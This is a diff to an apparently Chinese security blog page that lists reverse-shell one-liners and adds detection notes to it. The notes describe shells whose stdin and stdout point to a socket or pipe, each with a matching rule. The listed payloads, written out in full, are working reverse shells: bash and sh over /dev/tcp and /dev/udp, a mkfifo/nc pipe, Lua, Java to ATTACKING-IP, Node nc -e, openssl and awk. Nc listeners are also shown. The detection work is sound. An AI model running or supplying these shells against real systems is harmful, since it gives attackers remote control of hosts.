@@ -109,12 +109,18 @@ Listener:
 nc -nvlp <span class="m">1234</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG53.jpeg"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>创建了一个常住进程“bash -i”， 它的得0和1文件描述符都指向socket。</p>
+<p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span>sh -i &gt;<span class="p">&amp;</span> /dev/udp/127.0.0.1/1234 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="c1">#UDP</span>
 
 Listener:
 nc -u -lvp <span class="m">1234</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>创建了一个常住进程“sh -i”， 它的得0和1文件描述符都指向socket。</p>
+<p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span> <span class="m">196</span>&lt;&gt;/dev/tcp/127.0.0.1/1234<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WeChat9c018fc36b0256b4286d528e3e91651a.png"/></p>
@@ -171,9 +177,15 @@ rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG62.jpeg"/>
 <img alt="agent" class="img-fluid" src="../images/WechatIMG63.jpeg"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>创建了bash进程，0和1描述符都指向了pipe，这两个pipe关联到文件和nc上。</p>
+<p>匹配规则：bash进程的0，和1文件描述符指向pipe</p>
 <div class="highlight"><pre><span></span><span class="n">lua</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG54.jpeg"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>创建了sh进程，0和1描述符都指向了socket。</p>
+<p>匹配规则：sh的0，和1文件描述符指向socket</p>
 <p>Java</p>
 <div class="highlight"><pre><span></span><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> <span class="n">as</span> <span class="n">String</span><span class="o">[])</span>
@@ -199,6 +211,9 @@ rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f
 <span class="p">})();</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WechatIMG66.jpeg"/></p>
+<p>目标机执行后的结果如下：
+创建了sh进程，0和1描述符都指向了socket。</p>
+<p>匹配规则：bash的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span>require('child_process').exec('nc -e /bin/sh 127.0.0.1 1234')
 
 or
@@ -206,7 +221,10 @@ or
 -var x = global.process.mainModule.require
 -x('child_process').exec('nc 127.0.0.1 1234 -e /bin/bash')
 </pre></div>
-<p><img alt="agent" class="img-fluid" src="../images/WechatIMG63.jpeg"/></p>
+<p><img alt="agent" class="img-fluid" src="../images/WechatIMG63.jpeg"/>
+目标机执行后的结果如下：</p>
+<p>创建了bash进程，0和1描述符都指向了pipe，这两个pipe关联到nc进程上。nc创建了socket外联。</p>
+<p>匹配规则：bash进程的0，和1文件描述符指向pipe</p>
 <p>用openssl 反弹shell</p>
 <p>攻击者</p>
 <div class="highlight"><pre><span></span>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="m">365</span> -nodes <span class="c1">#Generate certificate</span>
@@ -216,7 +234,9 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span 
 <p>靶机</p>
 <div class="highlight"><pre><span></span>openssl s_client -quiet -connect <span class="m">127</span>.0.0.1:1234<span class="p">|</span>/bin/bash<span class="p">|</span>openssl s_client -quiet -connect <span class="m">127</span>.0.0.1:12345
 </pre></div>
-<p><img alt="agent" class="img-fluid" src="../images/WeChat8872f342986ad270beb9f2cfed15620b.png"/></p>
+<p><img alt="agent" class="img-fluid" src="../images/WeChat8872f342986ad270beb9f2cfed15620b.png"/>目标机执行后的结果如下：</p>
+<p>创建了一个常住进程“bash”， 它的得0和1文件描述符都指向socket。</p>
+<p>匹配规则：bash进程的0，和1文件描述符指向socket</p>
 <div class="highlight"><pre><span></span>awk <span class="s1">'BEGIN {s = "/inet/tcp/0/127.0.0.1/1234"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null
 </pre></div>
 <p>无明显文件句柄特征</p>
@@ -250,6 +270,9 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; <span 
 <span class="p">}</span>
 </pre></div>
 <p><img alt="agent" class="img-fluid" src="../images/WeChatb7a57e2e1c37e20c37bb206518c75d7a.png"/></p>
+<p>目标机执行后的结果如下：</p>
+<p>创建了一个常住进程“sh ”， 它的得0和1文件描述符都指向socket。</p>
+<p>匹配规则：sh进程的0，和1文件描述符指向socket</p>
 <p>Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>
   </div>
 </article>
